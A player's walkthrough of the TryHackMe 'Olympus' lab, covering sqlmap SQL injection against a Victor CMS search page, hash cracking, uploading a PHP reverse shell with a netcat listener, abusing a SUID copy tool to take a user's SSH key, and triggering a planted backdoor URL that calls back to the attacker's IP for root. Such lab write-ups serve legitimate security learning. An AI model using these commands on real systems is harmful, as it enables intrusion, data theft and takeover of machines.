# **_Olympus TryHackMe Writeup_**
## SneakyTurtle158
## Room Creator: G4vr0ch3
[Olympus](https://tryhackme.com/room/olympusroom)

_**Disclaimer:** I've done my best in this walkthrough to not give away too much, as you progress through the walkthrough more information will inherently be available to you. This is a great room to learn and practice a lot of different skills so my recommendation to you is not to jump ahead. Take your time and learn each step!_

Let's kick this off with a quick nmap scan to see what we are working with:
`nmap -T4 -A -p- IPADDRESS`

From the results, you will see that we've got 22 & 80 open so let's start with the website and go from there. 

When you try to reach the website in your browser, you will notice that it's not connecting.. you may also notice in the bottom left corner that it is trying to redirect to olympus.thm. To fix this and access the site, the first thing we will need to do is add this to our hosts file:
`sudo echo "IPADDRESS olympus.thm" >> /etc/hosts`

Now we can connect:
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/1.png">
</p>

We can see from the text on the page that the old version of the website is still accessible, I like old stuff becuase it is usually more vulnerable. Let's see if we can find it with some directory busting. I like to use gobuster, but you could us ffuf or dirbuster if you prefer:
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/2.png">
</p>

I used a the common.txt wordlist in the dirb directory and it pretty quickly picked up the old website's directory:
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/3.png">
</p>

Looks like we found a CMS page running Victor CMS.
I was pretty quickly able to find an exploit for SQL injection using the search.php at https://www.exploit-db.com/exploits/48734

I decided to use sqlmap to automate the process of testing it out:

```bash
sqlmap -u "http://olympus.thm/REDACTED/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3 --tables
```
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/4.png">
</p>

Looks like there is an olympus database in there with a flag table, let's see if we can dump it..
```bash
sqlmap -u "http://olympus.thm/REDACTED/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3 --tables -T flag --dump
```
If you are curious about the specific switches that I'm using, take a look at the following article: https://hackertarget.com/sqlmap-tutorial/
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/5.png">
</p>

Alright, let's see what else we can find in this database, looking back at the tables, we see that there is a users table in the olympus database so let's dump that next and see what we get:
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/6.png">
</p>

Now that we've got some hashes, I'll use John to try to crack them:
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/7.png">
</p>

Looks like I'm only going to be able to get prometheus' password, let's try to use it to log into the web application:
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/8.png">
</p>
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/9.png">
</p>

_Bingo_
After some poking around, I can see that we have a regular user role and the other two accounts have salted hashes (explains why only prometheus' creds cracked)
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/10.png">
</p>

Looking around, I'm not seeing an immediate RCE vulnerability that stands out to me.

What is interesting though is the domain for root and zues: @chat.olympus.thm

Let's add it to /etc/hosts and see what we get...
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/11.png">
</p>

Aaannddd another login page.

After poking around for a while (longer than I'd like to admit) I just tried putting in the creds that I already had for the previous CMS admin panel and.. It worked!

<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/12.png">
</p>

Ok so we have access to a chat app and it looks like there is some good info in there. This brings me back to the gobusting I did on the chat.olympus.thm domain earlier when I couldn't figure out how to login (which I thought was useless at the time.) Turns out I found a directory that I had access to, but provided an empty page (/uploads). However, it looks like the chat is telling us that the file names get changed when they are uploaded...

So first thing's first, let's get a php shell uploaded so that we can try to find it and get a reverse shell. I use the [pentestmonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) reverse shell (make sure you change the IP address and port) and then I uploaded it to the chat:
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/13.png">
</p>

Now I just need to figure out what the name changing function is changing the name of my reverse shell too and then I can navigate to it. 

So, thinking back to what we know, we have exploited an SQL database previously, so maybe the chat page is storing information in the SQL database. Looking back at the tables we enumerated before, we can see that there is a chats table in the olympus database. So let's dump it and see what we get:

```bash
sqlmap -u "http://olympus.thm/REDACTED/search.php" --data="search=1337*&submit=" --dbs --random-agent -v 3 --tables -T chats --dump
```
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/14.png">
</p>
Bingo! Now we know the name of our file. Let's pop up a netcat listener first
`nc -nvlp 7788`
(port number depends on what you picked for your port in your reverse shell)
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/15.png">
</p>
Nice, now we've got a shell.

Let's clean up the shell a little bit with python:
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

Moving to the /home directory it looks like we have access to zeus and our next flag:
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/16.png">
</p>

There's also a note from Prometheus to zeus that as some interesting info in it that _might_ be useful at some point.
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/17.png">
</p>

 Now time to escalate so I'll check for SUID bits first:
 `find / -perm -4000 -type f -exec ls -la {} 2>/dev/null \;`
 <p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/18.png">
</p>
 
 And we got a whole lot of output. First thing that catches my eye though is that /usr/bin/cputils binary that has zeus permissions. 
 
 Looks like its a copy utility, knowing that it executed with zeus' permissions, I am going to see if I can use it to copy zeus' ssh id_rsa key.
 <p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/19.png">
</p>
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/20.png">
</p>

 Nice, now lets make a copy of it on my local machine and try to ssh in as zeus (dont forget to change the permissions on the id_rsa file you create):
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/21.png">
</p>

  Looks like there's a passphrase, let's see if we can extract it using ssh2john:
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/22.png">
</p>

Now that we have the passphrase, let's ssh in and see what we can do.

At this point I tried a lot of different priv escalation techniques and even resorted to pulling and running Linpeas to see if I could catch anything. One thing that kept standing out to me was the different groups that I had access to:
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/23.png">
</p>

 So I decided to see what access each group would give me. I knew I couldn't use sudo without the passwd so I started with the adm group:
 
 `find / -group adm 2>/dev/null`
 
 As you would expect, the adm group gave me access to a bunch of log files. I searched around for a while to see if any of the logs captured a usable password but no such luck.
 
 Next I checked the zeus group to see what else I had access to:
 
 `find / -group zeus 2>/dev/null`
 
 One thing that immediately stood out was that I had access to some files in /var/www/html/ so I immediately headed over there to take a look:
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/24.png">
</p>
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/25.png">
</p>

 This could be interesting, we don't have write permissions but lets at least see what the file is...
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/26.png">
</p>

Looks like a backdoor! Remember the note from Prometheus? Looks like this might be his backdoor to super user access that he was talking about. Let's serve up a php server from the file's location and connect to it on our local machine:
 
 `php -S 10.10.92.52:7890`
 
 When connecting to it, it's asking us for a password, luckily in the actual php file we can see what the $pass variable is and we can just copy and paste it into the field:
 
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/27.png">
</p>

<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/28.png">
</p>

 Looks like it's giving us the sintax for our backdoor, let's set up a listener on the attack machine and send the request with the correct syntax:
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/29.png">
</p>

Then navigate to: http://chat.olympus.thm:7890/VIGQFQFMYOST.php?ip=10.13.40.163&port=8899

_And we've got root!_
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/30.png">
</p>
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/31.png">
</p>

Looks like we still have work to do.
 
So it's recommending that we ssh as root to search for the bonus flag but there's no root id_rsa key and we don't know the password for root.
 
To be honest, at this point I just took the lazy route since I already still have my zeus ssh shell open so I just changed zeus' password and added them to the sudo group:
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/32.png">
</p>
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/33.png">
</p>

The hint in the root.flag file tells us that regex can be helpful. Let's see what we can find since we know the syntax of the flag is flag{

`find / -type f -exec fgrep -l 'flag{' {} \;`
<p align="center">
  <img src="https://github.com/SneakyTurtle158/TryHackMe_Writeups/blob/pictures/olympus_pics/34.png">
</p>

I'm not going to give you the final path, you should be able to get it yourself at this point.

## Thanks for following along!
